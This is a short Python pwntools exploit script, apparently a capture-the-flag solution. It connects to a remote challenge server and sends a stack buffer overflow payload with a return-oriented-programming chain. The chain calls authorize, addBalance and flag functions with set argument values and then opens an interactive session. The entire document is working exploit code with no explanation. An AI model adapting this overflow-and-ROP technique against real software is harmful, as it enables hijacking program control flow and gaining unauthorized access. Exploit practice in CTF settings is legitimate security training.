from pwn import *
#p=process('./c')
p=remote('shell.actf.co',19400)

sla = lambda x,y : p.sendlineafter(x,y)

authorize=0x401196
addBalance=0x4011ab
flag=0x4011eb

pay = "A"*0x30+"B"*0x8
pay += p64(authorize)
pay += p64(0x0000000000401403)+p64(0xdeadbeef)+p64(addBalance)
pay += p64(0x0000000000401403)+p64(0xba5eba11)+p64(0x0000000000401401)+p64(0xbedabb1e)+"A"*8\
        +p64(flag)

sla('access','1')
p.sendline(pay)

p.interactive()
